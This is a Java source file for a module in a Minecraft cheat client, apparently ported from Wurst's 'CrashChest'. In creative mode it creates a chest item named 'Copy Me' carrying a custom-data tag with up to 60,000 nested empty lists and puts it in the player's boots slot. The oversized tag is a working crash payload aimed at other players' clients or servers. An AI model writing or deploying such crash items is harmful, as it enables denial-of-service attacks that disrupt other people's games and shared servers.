package com.mentalfrostbyte.jello.module.wurst;

import com.mentalfrostbyte.jello.Jello;
import com.mentalfrostbyte.jello.module.Category;
import com.mentalfrostbyte.jello.module.Module;
import com.mentalfrostbyte.jello.setting.NumberValue;
import net.minecraft.core.component.DataComponents;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.chat.Component;
import net.minecraft.world.entity.EquipmentSlot;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.component.CustomData;
import net.minecraft.world.level.block.Blocks;

/** Wurst CrashChest: puts a chest item with a huge custom-data tag in the boots slot. */
public class CrashChest extends Module {
	private final NumberValue entries = addValue(new NumberValue("Entries", 40000, 1000, 60000, 1000));

	public CrashChest() {
		super("Crash Chest", 0, Category.ITEM);
	}

	@Override
	public void onEnable() {
		if (mc.player == null) {
			return;
		}
		if (!mc.player.getAbilities().instabuild) {
			Jello.addChatMessage("Creative mode only.");
			setToggled(false);
			return;
		}
		if (!mc.player.getItemBySlot(EquipmentSlot.FEET).isEmpty()) {
			Jello.addChatMessage("Please clear your shoes slot.");
			setToggled(false);
			return;
		}
		ItemStack stack = new ItemStack(Blocks.CHEST);
		CompoundTag tag = new CompoundTag();
		ListTag list = new ListTag();
		for (int i = 0; i < (int) entries.getValue(); i++) {
			list.add(new ListTag());
		}
		tag.put("www.wurstclient.net", list);
		stack.set(DataComponents.CUSTOM_DATA, CustomData.of(tag));
		stack.set(DataComponents.CUSTOM_NAME, Component.literal("Copy Me"));
		mc.player.setItemSlot(EquipmentSlot.FEET, stack);
		Jello.addChatMessage("Item has been placed in your shoes slot.");
		setToggled(false);
	}
}
